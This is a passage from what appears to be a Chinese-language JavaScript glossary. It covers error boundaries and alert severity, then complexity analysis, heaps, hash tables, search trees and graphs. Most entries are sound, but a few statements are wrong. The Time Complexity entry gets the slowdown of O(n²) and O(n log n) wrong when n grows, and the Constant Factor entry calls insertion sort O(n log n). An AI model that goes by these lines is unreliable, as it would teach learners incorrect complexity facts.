错误边界是「**把错误限制在局部、不让它炸掉整个界面或整个请求**」的结构：React 里用 `componentDidCatch`/`static getDerivedStateFromError` 实现，捕获子树的渲染错误并渲染降级 UI；Node 服务端则体现为每个请求独立的 try/catch 与错误中间件（一个请求失败不应影响其他请求），以及「非关键功能失败时降级为无此功能」的容错设计。关键细节：错误边界**捕获不到**事件处理器里的错误、异步回调里的错误、服务端渲染的错误与边界自身的错误——这些仍需全局兜底；错误边界的作用是**隔离**而不是**吞掉**，捕获后一定要上报，否则会变成「用户看到空白、监控一片绿」的最坏情况。

也见 [Production Error Reporting（生产环境错误上报）](#production-error-reporting生产环境错误上报)。

示例：[`37_debugging_and_profiling/06_production_error_reporting.js`](37_debugging_and_profiling/06_production_error_reporting.js)

### Error Severity and Alerting（错误分级与告警）

错误分级是按**影响面与可恢复性**给错误定级（如 fatal / error / warning / info），并据此决定「立刻打电话叫人」「进日报」「只记日志」；告警则是在错误率或关键错误出现时触发通知。分级的核心价值是**让告警保持可信**——如果所有错误都发告警，团队会很快学会忽略它，真正的事故就被淹没了。关键细节：分级要基于**用户影响**而不是异常类型（「支付回调验签失败」比「某个 `TypeError`」严重得多），并设置**阈值与抑制**（如「5 分钟内同类错误超过 N 次才告警」「同一错误 1 小时只告警一次」）；每个告警都应绑定**明确的处理动作与负责人**，没有动作的告警等于噪音。**常见误解**：以为「告警越多越安全」——告警疲劳是可靠性事故的直接诱因之一。

也见 [Production Error Reporting（生产环境错误上报）](#production-error-reporting生产环境错误上报)。

示例：[`37_debugging_and_profiling/06_production_error_reporting.js`](37_debugging_and_profiling/06_production_error_reporting.js)

---

## 算法与数据结构

### Algorithm（算法）

算法是「把输入变成输出的一串明确步骤」，严格的算法定义要求五个性质：输入、输出、有穷性（有限步内终止）、确定性（同样的输入得到同样的输出）、可行性（每一步都真的能做到）。同一个问题通常有多个算法，它们的差别往往不在「对不对」，而在**代价**——这正是复杂度分析存在的理由。工程实践里，「选算法」与「选数据结构」几乎总是同一个决策的两面：说「用哈希表做」时，算法其实也一起定了。

**常见误解**：以为算法只存在于面试题里。真实项目里「去重」「分页」「求交集」「按依赖排序」都是算法选择问题，选错一次就可能是线上接口从 20ms 变成 8 秒。

也见 [Data Structure（数据结构）](#data-structure数据结构)、[Time Complexity（时间复杂度）](#time-complexity时间复杂度)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Data Structure（数据结构）

数据结构是「数据在内存里如何组织」，它决定了每种操作的代价：数组按下标访问是 O(1) 但中间插入是 O(n)，链表插入是 O(1) 但要找位置是 O(n)，哈希表平均 O(1) 但无序。**没有万能的数据结构**，只有「针对当前操作组合最划算」的那一个。选择的基本方法是：先列出业务里最高频的操作（查？插？删？排序？按范围取？），再看哪种结构把这些操作做得最便宜。

**常见误解**：把数据结构等同于「课本上的链表、树、图」。语言内置的 `Array`、`Map`、`Set`、`Object`、`TypedArray` 同样是数据结构，而且绝大多数场景直接用它们就够了。

也见 [Array（数组）](#array数组)、[Hash Table（哈希表）](#hash-table哈希表)。

示例：[`38_algorithms_and_data_structures/02_linked_list.js`](38_algorithms_and_data_structures/02_linked_list.js)、[`23_collections/07_map_vs_object.js`](23_collections/07_map_vs_object.js)

### Time Complexity（时间复杂度）

时间复杂度描述的是「运行时间随输入规模 n 增长的趋势」，而不是具体的毫秒数。它把每一步操作视为等价的「一次基本操作」，然后数出总共做了多少次，例如：单层循环访问 n 个元素是 O(n)，双重循环两两比较是 O(n²)，每次砍一半是 O(log n)。关键价值在于**预测**：n 从 100 涨到 100 万时，O(n²) 会慢一万倍，而 O(n log n) 只慢约两万分之一的比例——这是本地小数据测不出来的。

**常见误解**：拿「本地跑 100 条数据很快」当结论。复杂度的坑只在数据量变大时才暴露，所以必须按「未来的数据规模」而不是「今天的数据规模」来选。

也见 [Space Complexity（空间复杂度）](#space-complexity空间复杂度)、[Big-O Notation（大O表示法）](#big-o-notation大o表示法)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Space Complexity（空间复杂度）

空间复杂度描述算法「额外」占用的内存随 n 的增长趋势，注意关键词是**额外**——输入本身占的空间不计入，只算算法自己申请的那部分（临时数组、递归栈、哈希表、缓存）。常见档位：原地交换是 O(1)，归并排序需要一个 O(n) 的辅助数组，朴素递归的调用栈是 O(n)，而 DP 的完整二维表可能是 O(n²)。一个非常实用的技巧是「用时间换空间」或反过来：DP 里只保留上一行就能把 O(n²) 空间压到 O(n)。

**常见误解**：以为空间复杂度不重要。在移动端、嵌入式、以及需要处理千万级数据的 Node 服务里，内存往往比 CPU 更先成为瓶颈。

也见 [In-place Sort（原地排序）](#in-place-sort原地排序)、[Time Complexity（时间复杂度）](#time-complexity时间复杂度)。

示例：[`38_algorithms_and_data_structures/10_dynamic_programming.js`](38_algorithms_and_data_structures/10_dynamic_programming.js)

### Big-O Notation（大O表示法）

大 O 记号描述的是增长趋势的**上界**，写作 O(f(n))，读作「增长不快于 f(n) 的量级」。它有三条约定：只保留最高阶项（3n² + 100n + 5000 → O(n²)），忽略常数因子（2n 和 100n 都是 O(n)），并且通常要指明是最好/最坏/平均哪种情况。之所以能这么「粗暴」地丢弃细节，是因为当 n 足够大时，最高阶项会彻底压过其余一切。

**常见误解**：把大 O 当成性能测量的替代品。它只比较**趋势**，不比较**绝对速度**：n 很小时 O(n²) 的算法完全可能比 O(n log n) 更快，因为后者的常数因子更大。

也见 [Big-Θ and Big-Ω（大Θ与大Ω）](#big-θ-and-big-ω大θ与大ω)、[Constant Factor（常数因子）](#constant-factor常数因子)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Big-Θ and Big-Ω（大Θ与大Ω）

大 O 只给上界，因此不够精确：严格来说「二分查找是 O(n²)」这句话也是对的（因为它不会比 n² 更慢），只是毫无信息量。**大 Ω（Big-Omega）**给的是下界：Ω(f(n)) 表示「至少要花这么多」，例如任何基于比较的排序都是 Ω(n log n)。**大 Θ（Big-Theta）**给的是紧确界：Θ(f(n)) 表示上界和下界都是 f(n)，即「增长量级正好是它」。工程口语里说的「这是 O(n log n) 的算法」，实际想表达的是 Θ(n log n)。

**常见误解**：把 O 和 Θ 当同义词。面试和文档里普遍混用，但当你需要说「这个算法不可能更快」时，只有 Ω / Θ 能表达这层意思。

也见 [Big-O Notation（大O表示法）](#big-o-notation大o表示法)、[Growth Rate（增长率）](#growth-rate增长率)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Growth Rate（增长率）

增长率是复杂度分析的真正主题：不是「跑多久」，而是「n 翻倍时慢几倍」。对照表非常直观——O(1) 不变；O(log n) 只多一点点（n 翻倍只多 1 次比较）；O(n) 慢一倍；O(n log n) 略多于一倍；O(n²) 慢四倍；O(2ⁿ) 直接翻倍到无法承受。跨量级之间的差距会随 n 放大到荒谬的程度：n = 100 万时，O(n log n) 约两千万次操作，而 O(n²) 是一万亿次。

**常见误解**：只关注同一量级内的「谁快一点」。跨量级的优化（n² → n log n）永远优先于同量级内的微调。

也见 [Asymptotic Analysis（渐进分析）](#asymptotic-analysis渐进分析)、[Constant Factor（常数因子）](#constant-factor常数因子)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Constant Factor（常数因子）

常数因子是大 O 里被刻意忽略的那部分：循环体里做一次加法还是做一次字符串拼接，复杂度都写作 O(n)，但实际耗时可能差几十倍。它决定了两种「同量级」实现的真实胜负——例如同样是 O(n log n)，插入排序在小数组上常比快排快，所以标准库的快排会在子数组长度小于阈值时切换成插入排序。它也是为什么「用 `Map` 代替对象做频繁增删」这类优化值得做：量级不变，但常数因子变小。

**常见误解**：以为「复杂度一样所以随便选」。在 n 不大的常见业务场景里，常数因子往往就是决定性的那个因素。

也见 [Big-O Notation（大O表示法）](#big-o-notation大o表示法)、[Growth Rate（增长率）](#growth-rate增长率)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)

### Asymptotic Analysis（渐进分析）

渐进分析是「让 n 趋于无穷大」来分析算法代价的方法，它是大 O、大 Θ、大 Ω 这些记号背后的统一框架。做法是：写出代价关于 n 的表达式，然后取 n → ∞ 的极限行为，只关心主导项。它之所以合理，是因为我们关心的是「规模继续增长时会不会崩」，而不是「今天这一千条数据要几毫秒」。渐进分析同时也是**忽略硬件**的分析：它假定每次基本操作代价相同，因此不同机器上得到的结论一致。

**常见误解**：把渐进结论直接当作性能结论。渐进分析是必要条件而不是充分条件，选型时还要回到真实的 n 与真实的常数因子。

也见 [Big-O Notation（大O表示法）](#big-o-notation大o表示法)、[Best-Worst-Average Case（最好最坏与平均情况）](#best-worst-average-case最好最坏与平均情况)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)

### Best-Worst-Average Case（最好最坏与平均情况）

同一个算法在不同输入上代价可能差很多，所以要分三种情况讨论。以快速排序为例：**最好情况**是每次分区都正好对半分，O(n log n)；**最坏情况**是每次都选到当前最大或最小值（例如对已排序数组取首元素作 pivot），退化成 O(n²)；**平均情况**是在输入随机分布的假设下，期望为 O(n log n)。工程上有两条实践：报告性能时用**最坏情况**做安全边界，因为线上确实会有人传进已排序的数据；优化时关注**平均情况**，因为它决定日常体验。

**常见误解**：用「平均情况」掩盖最坏情况。哈希表平均 O(1) 但最坏 O(n)，攻击者可以刻意构造大量冲突的 key 把服务打垮（HashDoS），这正是很多语言给哈希函数加随机种子的原因。

也见 [Amortized Analysis（均摊分析）](#amortized-analysis均摊分析)、[Tree Degeneration（树的退化）](#tree-degeneration树的退化)。

示例：[`38_algorithms_and_data_structures/08_sorting_algorithms.js`](38_algorithms_and_data_structures/08_sorting_algorithms.js)、[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Amortized Analysis（均摊分析）

均摊分析算的是**一连串操作的平均代价**，而不是单次操作的最坏代价。最经典的例子是动态数组的 `push`：单次可能因为扩容而要复制整个数组（O(n)），但把 n 次 push 连起来看，总代价是 O(n)，因此**均摊**下来每次是 O(1)。推导的关键是「扩容按倍数而不是按固定量增长」——每次扩容后，前一次扩容的复制成本被后续 n 次廉价操作摊掉。理解它的意义在于避免误判：`push` 偶尔慢一次是正常的，不意味着实现有性能问题。

**常见误解**：把均摊复杂度当成平均复杂度。**均摊**是对「任意一串操作序列」的最坏总代价取平均，是确定性的保证；**平均**依赖输入的概率分布假设，两者完全不同。

也见 [Best-Worst-Average Case（最好最坏与平均情况）](#best-worst-average-case最好最坏与平均情况)、[Array（数组）](#array数组)。

示例：[`38_algorithms_and_data_structures/01_big_o_and_complexity.js`](38_algorithms_and_data_structures/01_big_o_and_complexity.js)、[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)

### Array（数组）

数组是**连续内存 + 下标直接寻址**的线性结构，因此按下标读写是 O(1)，遍历对 CPU 缓存极其友好。代价在两端之外的位置：中间插入或删除需要把后面的元素整体搬移，O(n)。JS 的 `Array` 是动态数组（可自动扩容），并且因为历史原因可以是不连续的「稀疏数组」或混装任意类型——**混装类型会丢掉引擎的类型特化优化**，这是 JS 数组比 C 数组慢的主要原因之一。

**常见误解**：用 `arr.shift()` / `arr.unshift()` 做队列。它们要搬移整个数组，是 O(n)，循环里用会退化成 O(n²)——队列请用双端队列或头指针。

也见 [Linked List（链表）](#linked-list链表)、[Queue（队列）](#queue队列)。

示例：[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)、[`24_typed_arrays/01_arraybuffer_basics.js`](24_typed_arrays/01_arraybuffer_basics.js)

### Linked List（链表）

链表由一组**节点**串成，每个节点存「值」和「下一个节点在哪」（指针）。**单向链表**只有 `next`，只能从前往后走；**双向链表**同时有 `next` 和 `prev`，可以两头走，代价是每个节点多存一个指针。它的核心优势是「已知节点时」的 O(1) 插入与删除（改指针即可，不用搬移数据），核心劣势是**不支持随机访问**——想拿第 k 个必须从头走 k 步，O(n)。

**常见误解**：以为链表「比数组快」。链表每个节点都是独立对象，内存分散、缓存不友好，实际遍历通常**比数组慢好几倍**。链表真正的用武之地是「哈希表 + 双向链表」这种结构（如 LRU 缓存），需要频繁在中间摘除和移动节点。

也见 [Array（数组）](#array数组)、[Queue（队列）](#queue队列)。

示例：[`38_algorithms_and_data_structures/02_linked_list.js`](38_algorithms_and_data_structures/02_linked_list.js)

### Stack（栈）

栈是**后进先出（LIFO，Last In First Out）**的受限线性表：只能在「栈顶」一端进出，操作有 `push`（入栈）、`pop`（出栈）、`peek`（看栈顶，不弹出）。它是对「最近发生的事最相关」这类场景的自然建模。真实世界里到处都是栈：函数调用栈、撤销/重做、浏览器前进后退、括号匹配、深度优先搜索的待访问集合、表达式求值的操作符栈。用数组实现栈是完美的——`push`/`pop` 都在数组末尾，均摊 O(1)。

**常见误解**：以为栈是某种特殊库。数组只要只用末尾进出，它就是一个栈。

也见 [Queue（队列）](#queue队列)、[Deque（双端队列）](#deque双端队列)。

示例：[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)

### Queue（队列）

队列是**先进先出（FIFO，First In First Out）**的受限线性表：一端进（队尾 `enqueue`），另一端出（队头 `dequeue`）。它建模的是「公平排队」——先来的先服务，天然适用于任务调度、消息队列、BFS 的待访问集合、请求限流、打印队列。实现上的关键是**不要用数组的 `shift()`**：`shift` 需要搬移所有元素，是 O(n)，在循环里就成了 O(n²)。正确做法是环形缓冲（用取模让下标绕回）或「头指针 + 定期压缩」，也可以用链表。

**常见误解**：`[1,2,3].shift()` 看起来很像出队，于是被大量误用。它语义上确实是出队，但代价是 O(n) 而不是 O(1)。

也见 [Stack（栈）](#stack栈)、[Deque（双端队列）](#deque双端队列)。

示例：[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)

### Deque（双端队列）

双端队列（double-ended queue，读作 "deck"）是**两端都能进出**的线性结构，因此它是栈和队列的超集：只从一端进出就是栈，一端进另一端出就是队列。用**环形缓冲**（固定或可扩容的数组 + 头尾两个下标 + 取模回绕）实现，两端操作都是 O(1) 均摊。它是「滑动窗口」类问题的标配容器，也是实现任务窃取调度器的基础。

**常见误解**：以为 JS 有内置的 deque。标准库没有，但 `Array` 的 `push`/`pop` 在尾部是 O(1)，配合一个手动维护的头下标就能模拟——这也是示例采用的做法。

也见 [Queue（队列）](#queue队列)、[Sliding Window（滑动窗口）](#sliding-window滑动窗口)。

示例：[`38_algorithms_and_data_structures/03_stack_and_queue.js`](38_algorithms_and_data_structures/03_stack_and_queue.js)

### Priority Queue（优先队列）

优先队列不是「先来先服务」，而是「**优先级最高的先出**」：每次出队的都是当前优先级最大的（或最小的）元素。它不保证整体有序，只保证能 O(log n) 拿到极值、O(log n) 插入新元素。标准实现就是二叉堆。真实场景：任务调度（高优先级任务插队）、Dijkstra 最短路、Top-K 大文件（只保留 K 个最大的）、事件模拟、限流器。

**常见误解**：以为优先队列 = 排序数组。排序数组取极值是 O(1) 但插入是 O(n)，堆是插入和取极值都 O(log n)——**堆是折中后的最优解**，代价是堆内部无序，不支持「查第 3 大」。

也见 [Heap（堆）](#heap堆)、[Binary Heap（二叉堆）](#binary-heap二叉堆)。

示例：[`38_algorithms_and_data_structures/06_heap_and_priority_queue.js`](38_algorithms_and_data_structures/06_heap_and_priority_queue.js)

### Heap（堆）

堆是一棵满足**堆序性质**的完全二叉树：**最小堆**里每个父节点都 ≤ 它的孩子（根是最小值），**最大堆**反之（根是最大值）。注意堆序只约束父子之间，**兄弟之间没有任何约束**——这就是为什么堆只能快速拿极值，却不能快速查找任意元素。堆的三大操作：取极值 O(1)，插入 O(log n)，删除极值 O(log n)。

**常见误解**：把堆和「内存堆（heap memory）」混为一谈，两者唯一的共同点只是名字。另一个常见误解是以为堆是一种排好序的结构——它不是，堆里除了根以外，别的元素位置都没有排序含义。

也见 [Binary Heap（二叉堆）](#binary-heap二叉堆)、[Priority Queue（优先队列）](#priority-queue优先队列)。

示例：[`38_algorithms_and_data_structures/06_heap_and_priority_queue.js`](38_algorithms_and_data_structures/06_heap_and_priority_queue.js)

### Binary Heap（二叉堆）

二叉堆是堆最常见的实现：一棵**完全二叉树**（除最后一层外全填满，最后一层靠左排列）。形状规整带来一个巨大的好处——**可以直接用数组存储，完全不需要指针**：下标 i 的左孩子是 `2i+1`，右孩子是 `2i+2`，父节点是 `Math.floor((i-1)/2)`。这意味着二叉堆既没有链表节点的内存开销，又有极好的缓存局部性，是优先队列的事实标准。

**常见误解**：以为必须手写二叉树节点类。数组表示不仅更简单，而且更快；只有在需要「修改任意元素的优先级」（需要额外存位置索引）时才需要额外簿记。

也见 [Heap（堆）](#heap堆)、[siftUp and siftDown（上浮与下沉）](#siftup-and-siftdown上浮与下沉)。

示例：[`38_algorithms_and_data_structures/06_heap_and_priority_queue.js`](38_algorithms_and_data_structures/06_heap_and_priority_queue.js)

### siftUp and siftDown（上浮与下沉）

这两个是维护堆序的**全部秘密**。**siftUp（上浮）**用于插入：把新元素放到数组末尾，然后不断和父节点比较，若违反堆序就交换，直到位置正确——最多走树高，O(log n)。**siftDown（下沉）**用于删除堆顶：把末尾元素搬到根，然后不断和「更小的那个孩子」比较并交换，直到位置正确——同样 O(log n)。注意细节：下沉时必须先挑出较小的孩子再比，否则可能把孩子中较大的那个换上来，破坏堆序。

**常见误解**：以为插入和删除会「整理整个堆」。它们只沿一条从根到叶的路径走，这正是 O(log n) 的来源。也见 [Binary Heap（二叉堆）](#binary-heap二叉堆)、[Heapify（建堆）](#heapify建堆)。

示例：[`38_algorithms_and_data_structures/06_heap_and_priority_queue.js`](38_algorithms_and_data_structures/06_heap_and_priority_queue.js)

### Heapify（建堆）

Heapify 指「把一个无序数组原地整形成一个合法堆」。最直觉的做法是逐个插入（n 次 siftUp），复杂度 O(n log n)；但更好的做法是**从最后一个非叶节点开始，倒着对每个节点做一次 siftDown**，复杂度只要 **O(n)**。为什么更快？因为绝大多数节点都在底层，下沉距离很短，把所有节点的下沉距离加起来收敛到 2n 而不是 n log n。建堆是堆排序的第一步（建堆 O(n) + n 次取极值 O(n log n)）。

**常见误解**：以为建堆也是 O(n log n)。「自底向上的 siftDown 建堆」是 O(n)，这是一个经典的反直觉结论，也是均摊/求和式分析的漂亮案例。

也见 [siftUp and siftDown（上浮与下沉）](#siftup-and-siftdown上浮与下沉)、[Sorting Algorithm（排序算法）](#sorting-algorithm排序算法)。

示例：[`38_algorithms_and_data_structures/06_heap_and_priority_queue.js`](38_algorithms_and_data_structures/06_heap_and_priority_queue.js)

### Hash Table（哈希表）

哈希表（散列表）用「算一次哈希、直接跳到目标位置」的方式，把查找从 O(n) 降到**平均 O(1)**。它由两个部件组成：**哈希函数**（把 key 映射成一个整数，再对桶数量取模得到桶下标）和**冲突解决策略**（不同 key 落到同一个桶时怎么办）。插入、查找、删除都是「算下标 → 在桶里找」。它是工程上性价比最高的数据结构，JS 的 `Map`、`Set`、对象属性都是它的实现。

**常见误解**：以为哈希表是 O(1)——只有**平均**是 O(1)，最坏情况是 O(n)。而且哈希表**不保证顺序**，需要按插入顺序遍历请用 `Map`（它保证插入序）。

也见 [Hash Function（哈希函数）](#hash-function哈希函数)、[Hash Collision（哈希冲突）](#hash-collision哈希冲突)、[Load Factor（负载因子）](#load-factor负载因子)。

示例：[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Hash Function（哈希函数）

哈希函数把任意 key 转换成一个大整数，再由「对桶数量取模」映射到具体桶。一个好的哈希函数要满足：**确定性**（同一个 key 永远得到同一个值）、**均匀性**（不同 key 尽量分散到不同桶，避免堆积）、**高效**（计算本身必须是 O(key 长度)、够快）、**雪崩效应**（输入差一个字符，输出应当面目全非）。JS 里字符串没有内建哈希，手写时常采用 `hash = (hash * 31 + charCode) | 0` 这类多项式滚动哈希。

**常见误解**：以为哈希值是「唯一编号」。哈希值必然可能重复（鸽笼原理），哈希表之所以正确，靠的是**冲突解决策略**而不是哈希函数本身。

也见 [Hash Table（哈希表）](#hash-table哈希表)、[Hash Collision（哈希冲突）](#hash-collision哈希冲突)。

示例：[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Hash Collision（哈希冲突）

冲突是指两个不同的 key 算出了同一个桶下标。两种主流解决方式：**链地址法（separate chaining）**——每个桶挂一条链表（或数组），冲突的 key 追加到链上，实现简单、删除方便；**开放寻址法（open addressing）**——冲突时按固定探测序列（线性探测、二次探测、双重哈希）在表内找下一个空槽，缓存更友好、不用额外内存，但删除需要「墓碑标记」，且负载因子高时性能急剧劣化。

**常见误解**：以为好的哈希函数能消除冲突。冲突是数学上不可避免的，能优化的只是冲突的**分布**与**处理成本**。也见 [Hash Table（哈希表）](#hash-table哈希表)、[Load Factor（负载因子）](#load-factor负载因子)。

示例：[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Load Factor（负载因子）

负载因子 = 已存元素数 / 桶数量，衡量哈希表的「拥挤程度」。它直接决定性能：链地址法下平均每桶链长就是负载因子，所以负载因子 3 意味着查找平均要比较 3 次；开放寻址法下负载因子越接近 1，探测次数越爆炸式增长。因此实现会设一个**阈值**（典型 0.75），一旦超过就触发扩容。0.75 这个值是空间与时间之间的经验折中——为了省内存把阈值调到 0.95，性能会掉得比省下的内存划算得多。

**常见误解**：以为负载因子是「表的填充百分比越大越省内存就越好」。实际上超过阈值后每次操作的平均代价会显著上升，扩容是必须的。

也见 [Rehash（重哈希扩容）](#rehash重哈希扩容)、[Hash Table（哈希表）](#hash-table哈希表)。

示例：[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Rehash（重哈希扩容）

扩容就是「申请一个更大的桶数组（通常翻倍），把旧表里的每个元素重新计算下标并搬过去」。关键点是**必须重新算哈希下标**（因为桶数量变了，`hash % 新容量` 的结果不同），这个过程叫 rehash。它的代价是 O(n)，但因为是按倍数扩容，均摊到每次插入只有 O(1)——和动态数组扩容是同一个道理。

**常见误解**：以为扩容只是「复制数组」。如果忘了重新取模，元素就会落在错误的桶里，查找随即失效——这是手写哈希表最常见的 bug。

也见 [Load Factor（负载因子）](#load-factor负载因子)、[Amortized Analysis（均摊分析）](#amortized-analysis均摊分析)。

示例：[`38_algorithms_and_data_structures/04_hash_table.js`](38_algorithms_and_data_structures/04_hash_table.js)

### Binary Search Tree（二叉搜索树）

二叉搜索树（BST）是一棵二叉树，且对**每一个**节点都满足：左子树全部节点的值 < 根 < 右子树全部节点的值。这条性质带来一个强推论：每比较一次就能砍掉一半候选范围，于是查找、插入、删除都是 O(树高)。**中序遍历**一棵 BST 会得到升序序列，这是它最常用的性质（也用来验证一棵树是不是合法 BST）。理想情况下树高是 log n，但取决于插入顺序。

**常见误解**：以为 BST 的查找总是 O(log n)。只有**平衡**的 BST 才是；顺序插入 1..n 会退化成链表，见 [Tree Degeneration（树的退化）](#tree-degeneration树的退化)。

也见 [Tree Traversal（树的遍历）](#tree-traversal树的遍历)、[Balanced Tree（平衡树）](#balanced-tree平衡树)。

示例：[`38_algorithms_and_data_structures/05_binary_search_tree.js`](38_algorithms_and_data_structures/05_binary_search_tree.js)

### Tree Traversal（树的遍历）

遍历是按某种固定顺序访问树里每一个节点，三种深度优先顺序的区别只看「根在哪一步被访问」：**前序（pre-order）**根 → 左 → 右，用来复制/序列化一棵树；**中序（in-order）**左 → 根 → 右，对 BST 得到升序序列；**后序（post-order）**左 → 右 → 根，用来做自底向上的计算（如统计子树大小、释放内存、表达式求值）。三者都可以用递归几行写完，也可以用显式栈改写（避免深树爆栈）。

**常见误解**：以为三种遍历只是「顺序不一样，结果差不多」。实际它们解决的问题完全不同，选错了算法思路就错了。

也见 [Level-Order Traversal（层序遍历）](#level-order-traversal层序遍历)、[Binary Search Tree（二叉搜索树）](#binary-search-tree二叉搜索树)。

示例：[`38_algorithms_and_data_structures/05_binary_search_tree.js`](38_algorithms_and_data_structures/05_binary_search_tree.js)

### Level-Order Traversal（层序遍历）

层序遍历（也叫广度优先遍历 BFS）按「一层一层、从左到右」访问节点，而不是一头扎到底。实现必须借助**队列**：根入队 → 循环「出队一个、访问它、把它的孩子入队」。它天然适合「按距离/层级」办事的场景：求树的最小深度、按层打印、找最近的节点。技巧：如果想区分每一层，可以在每轮循环开始时记录当前队列长度，只处理这么多节点。

**常见误解**：用递归去写层序遍历——递归天然是深度优先，写层序必须用队列（或递归时额外带上层号参数再按层收集）。

也见 [Tree Traversal（树的遍历）](#tree-traversal树的遍历)、[Queue（队列）](#queue队列)。

示例：[`38_algorithms_and_data_structures/05_binary_search_tree.js`](38_algorithms_and_data_structures/05_binary_search_tree.js)

### Tree Degeneration（树的退化）

退化指 BST 因为插入顺序不当而长成一条「链」：顺序插入 1, 2, 3, ..., n，每个新节点都往右挂，树高变成 n，于是查找从 O(log n) 恶化成 **O(n)**——BST 的所有优势荡然无存。这是真实的工程风险：从数据库按 id 顺序读出来再逐个插入 BST，就会精确地触发最坏情况。解决办法是使用平衡树，或插入前把数据打乱。

**常见误解**：以为「BST 是 O(log n) 的数据结构」。它只是「O(树高)」，而树高取决于数据，不是结构本身保证的。

也见 [Balanced Tree（平衡树）](#balanced-tree平衡树)、[Best-Worst-Average Case（最好最坏与平均情况）](#best-worst-average-case最好最坏与平均情况)。

示例：[`38_algorithms_and_data_structures/05_binary_search_tree.js`](38_algorithms_and_data_structures/05_binary_search_tree.js)

### Balanced Tree（平衡树）

平衡树通过**旋转**等再平衡操作，把树高强行维持在 O(log n)，从而保证最坏情况下所有操作都是 O(log n)，不受插入顺序影响。两种经典方案：**AVL 树**严格控制左右子树高度差不超过 1，因此更「矮」、查找更快，但插入删除时旋转更频繁；**红黑树**用颜色约束把最长路径限制在最短路径的两倍以内，平衡条件更宽松，插入删除的旋转次数更少，因此被大多数标准库采用（如 Java 的 `TreeMap`、C++ 的 `std::map`）。JS 没有内置平衡树，需要有序映射时通常得引第三方库或用排序数组 + 二分查找替代。

**常见误解**：以为平衡树在任何场景都优于哈希表。哈希表平均 O(1) 更快，平衡树的价值在于**有序**——能做范围查询、找前驱后继、按序遍历，这些哈希表都做不到。

也见 [Tree Degeneration（树的退化）](#tree-degeneration树的退化)、[Binary Search Tree（二叉搜索树）](#binary-search-tree二叉搜索树)。

示例：[`38_algorithms_and_data_structures/05_binary_search_tree.js`](38_algorithms_and_data_structures/05_binary_search_tree.js)

### Graph（图）

图由**顶点**和**边**组成，用来表达「谁和谁有关系」。它比树更一般——树是「每个节点只有一个父节点、且无环」的特殊图。图的分类维度有三组：有向 / 无向、带权 / 无权、有环 / 无环。绝大多数「关系型」问题都能建模成图：社交网络、依赖关系、路网、状态机、编译器的模块依赖。图算法的成本通常写成 O(V + E)（顶点数 + 边数），而不是 O(n)。

**常见误解**：以为图必须用「图数据库」或某个库。用 `Map<string, string[]>` 表示邻接表，二十行代码就能跑 BFS/DFS。

也见 [Vertex and Edge（顶点与边）](#vertex-and-edge顶点与边)、[Adjacency List and Matrix（邻接表与邻接矩阵）](#adjacency-list-and-matrix邻接表与邻接矩阵)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Vertex and Edge（顶点与边）

**顶点（vertex，也叫节点 node）**是图里的实体，**边（edge）**是顶点之间的连接。一条边连接两个端点，在有向图里有方向和「起点 / 终点」之分。建模时最重要的决策是「什么是顶点」——同一份数据可以建出完全不同的图，例如把「人」当顶点得到关注关系图，把「人和帖子」都当顶点得到二分图。这个决策直接决定了算法能不能用。

**常见误解**：以为顶点必须是「对象」。顶点只是标识符，可以是字符串 id、数字、甚至复合键，只要能被 `Map` 索引即可。

也见 [Graph（图）](#graph图)、[Weight and Degree（权重与度）](#weight-and-degree权重与度)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Directed and Undirected Graph（有向图与无向图）

**无向图**的边没有方向，A—B 意味着两边互相可达（如好友关系、物理连接）；**有向图**的边带方向，A→B 不蕴含 B→A（如关注、依赖、单向道路）。实现上，无向图的一条边要在邻接表里存两次（A 的邻居里有 B，B 的邻居里也有 A），忘了对称插入是初学最常见的 bug。有向图还多出两个重要概念：**入度 / 出度**，以及只在有向无环图（DAG）上才存在的拓扑排序。

**常见误解**：以为「无向图是特殊的有向图，只是两条边而已」。语义上确实如此，但算法层面差别很大：无向图判环要用「父节点」排除回边，有向图则要用颜色标记或拓扑排序。

也见 [Directed Acyclic Graph（有向无环图）](#directed-acyclic-graph有向无环图)、[Weight and Degree（权重与度）](#weight-and-degree权重与度)。

示例：[`38_algorithms_and_data_structures/07_graph_traversal.js`](38_algorithms_and_data_structures/07_graph_traversal.js)

### Weight and Degree（权重与度）

**权重（weight）**是边上的数值，表示「代价」：距离、时间、费用、流量。带权图的最短路不能再用 BFS（BFS 只适用于边权都为 1 的无权图），需要 Dijkstra（非负权）或 Bellman-Ford（可有负权）。**度（degree）**是顶点连接的边数；有向图细分**入度（in-degree）**和**出度（out-degree）**。度有两个非常实用的性质：无向图中所有顶点的度数之和等于边数的两倍（握手定理），以及拓扑排序必须从入度为 0 的顶点开始。

